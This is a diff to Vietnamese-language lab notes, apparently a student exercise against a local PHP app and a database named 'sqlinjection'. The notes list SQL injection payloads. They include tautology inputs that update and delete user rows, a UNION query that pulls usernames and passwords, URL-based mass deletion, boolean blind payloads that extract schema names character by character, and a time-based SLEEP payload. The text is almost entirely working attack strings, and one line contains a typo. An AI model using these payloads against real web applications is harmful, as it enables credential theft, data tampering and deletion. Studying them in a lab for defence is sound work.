@@ -8,6 +8,11 @@ Sửa:
 ' OR 1=1; UPDATE user SET TenUser='duc', Pass='duc123' WHERE ID=1; -- 
 Xóa:
 ' OR 1=1; DELETE FROM user WHERE ID = 6; -- 
+Đánh cắp dữ liệu:
+Dò tìm có bao nhiêu cột: ' UNION SELECT 1,2,3,... --  
+Kết hợp dò chữ cái để lấy được thông tài khoản theo id:
+' UNION SELECT 29, TenUser, Pass FROM user -- 
+
 
 Xóa bằng link:
 http://localhost:3000/FormLoginAndWeb/delete.php?id=0 OR 1=1
@@ -19,25 +24,35 @@ http://localhost:3000/FormLoginAndWeb/view.php?id=0 OR 1=1
 - Dùng Blind SQLi:
 
 Dò chữ cái đầu tiên của database:
-'  OR ('1'='1' AND SUBSTRING(database(),1,1)='s') -- 
+'  OR SUBSTRING(database(),1,1)='s' -- 
 Dò chữ cái thứ 2 của database:
-'  OR ('1'='1' AND SUBSTRING(database(),2,1)='q') -- 
+'  OR SUBSTRING(database(),2,1)='q' -- 
 ...
-'  OR ('1'='1' AND SUBSTRING(database(),n,1)='s') --
+'  OR UBSTRING(database(),n,1)='s' --
+
+'  OR IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0) -- 
 
 
 Dò chữ cái đầu tiên của bảng thứ nhất:
-' OR ('1'='1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1)='U') --
+' OR SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1)='U' --
 Dò chữ cái thứ 2 của bảng thứ nhất:
-' OR ('1'='1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 2, 1)='U') --
+' OR SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 2, 1)='U' --
 ...
 Dò chữ cái đầu tiên của bảng thứ hai:
-' OR ('1'='1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1), 1, 1)='A') --
+' OR SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1), 1, 1)='A' --
 ...
 
 
 Dò chữ cái đầu tiên của cột thứ nhất,hai,ba trong bảng user:
-' OR ('1'='1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'user' AND table_schema='sqlinjection' LIMIT 0,1), 1, 1) = 'I') -- 
-' OR ('1'='1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'user' AND table_schema='sqlinjection' LIMIT 1,1), 1, 1) = 'P') -- 
-' OR ('1'='1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'user' AND table_schema='sqlinjection' LIMIT 2,1), 1, 1) = 'T') -- 
+' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'user' AND table_schema='sqlinjection' LIMIT 0,1), 1, 1) = 'I' -- 
+' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'user' AND table_schema='sqlinjection' LIMIT 1,1), 1, 1) = 'P' -- 
+' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'user' AND table_schema='sqlinjection' LIMIT 2,1), 1, 1) = 'T' -- 
 ...
+
+
+Dùng Time-based: (chưa dùng dc vì mysql không cho truy vấn sleep)
+' OR IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0) -- 
+
+
+
+
